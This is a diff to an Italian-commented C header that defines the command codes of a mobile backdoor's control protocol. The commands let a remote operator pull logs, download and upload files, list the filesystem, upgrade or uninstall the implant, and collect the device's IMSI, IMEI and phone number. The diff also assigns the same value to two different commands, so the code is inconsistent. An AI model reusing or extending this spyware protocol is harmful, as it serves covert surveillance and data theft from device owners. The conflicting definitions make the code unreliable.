@@ -252,31 +252,32 @@ extern wstring g_StrDemo;
 * Parametri del protocollo (i comandi validi iniziano da 1 in poi)
 */
 #define INVALID_COMMAND		(UINT)0x0	// Non usare
-#define PROTO_OK			(UINT)0x1	// OK
-#define PROTO_NO			(UINT)0x2	// Comando fallito o non e' stato possibile eseguirlo
-#define PROTO_BYE			(UINT)0x3	// Chiusura di connessione
+#define PROTO_OK			(UINT)0x1	/// OK
+#define PROTO_NO			(UINT)0x2	/// Comando fallito o non e' stato possibile eseguirlo
+#define PROTO_BYE			(UINT)0x3	/// Chiusura di connessione
 #define PROTO_CHALLENGE		(UINT)0x4	// CHALLENGE,16 byte da cifrare
 #define PROTO_RESPONSE		(UINT)0x5	// RESPONSE,16 byte cifrati
 #define PROTO_SYNC			(UINT)0x6	// Mandami i log
-#define PROTO_NEW_CONF		(UINT)0x7	// NEW_CONF,# prendi la nuova conf lunga # bytes
+#define PROTO_NEW_CONF		(UINT)0x7	/// NEW_CONF,# prendi la nuova conf lunga # bytes
 #define PROTO_LOG_NUM		(UINT)0x8	// LOG_NUM,# stanno per arrivare # logs
-#define PROTO_LOG			(UINT)0x9	// LOG,# questo log e' lungo # bytes
-#define PROTO_UNINSTALL		(UINT)0xa	// Uninstallati
-#define PROTO_RESUME		(UINT)0xb	// RESUME,nome,# rimandami il log "nome" a partire dal byte #
-#define PROTO_DOWNLOAD		(UINT)0xc	// DOWNLOAD,nome: mandami il file "nome" (in WCHAR, NULL terminato)
-#define PROTO_UPLOAD		(UINT)0xd	// UPLOAD,nome,directory,#: uppa il file "nome" lungo # in "directory"
+#define PROTO_LOG			(UINT)0x9	/// LOG,# questo log e' lungo # bytes
+#define PROTO_UNINSTALL		(UINT)0xa	/// Uninstallati
+//#define PROTO_RESUME		(UINT)0xb	// RESUME,nome,# rimandami il log "nome" a partire dal byte #
+#define PROTO_EVIDENCE_SIZE (UINT)0xb
+#define PROTO_DOWNLOAD		(UINT)0xb	/// DOWNLOAD,nome: mandami il file "nome" (in WCHAR, NULL terminato)
+#define PROTO_UPLOAD		(UINT)0xd	/// UPLOAD,nome,directory,#: uppa il file "nome" lungo # in "directory"
 #define PROTO_FILE			(UINT)0xe	// #, Sta per arrivare un file lungo # bytes
-#define PROTO_ID			(UINT)0xf	// Id univoco della backdoor, embeddato in fase di configurazione
-#define PROTO_INSTANCE		(UINT)0x10	// Id univoco che identifica il dispositivo dove gira la backdoor
+#define PROTO_ID			(UINT)0xf	/// Id univoco della backdoor, embeddato in fase di configurazione
+#define PROTO_INSTANCE		(UINT)0x10	/// Id univoco che identifica il dispositivo dove gira la backdoor
 #define PROTO_USERID		(UINT)0x11	// IMSI,# byte NON paddati del blocco (il blocco inviato e' paddato)
 #define PROTO_DEVICEID		(UINT)0x12	// IMEI,# byte NON paddati del blocco (il blocco inviato e' paddato)
 #define PROTO_SOURCEID		(UINT)0x13	// #telefono,# byte NON paddati del blocco (il blocco inviato e' paddato)
 #define PROTO_VERSION		(UINT)0x14	// #,bytes versione della backdoor (10 byte)
 #define PROTO_LOG_END		(UINT)0x15  // La spedizione dei log e' terminata
-#define PROTO_UPGRADE		(UINT)0x16	// Tag per l'aggiornamento del core
+#define PROTO_UPGRADE		(UINT)0x16	/// Tag per l'aggiornamento del core
 #define PROTO_ENDFILE		(UINT)0x17  // Tag che indica la terminazione della fase di download dei file
 #define PROTO_SUBTYPE		(UINT)0x18	// #,bytes che indicano la subversion "WINMOBILE"
-#define PROTO_FILESYSTEM	(UINT)0x19	// DWORD profondita', DWORD lunghezza del path, WCHAR path
+#define PROTO_FILESYSTEM	(UINT)0x19	/// DWORD profondita', DWORD lunghezza del path, WCHAR path
 
 /**
  * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
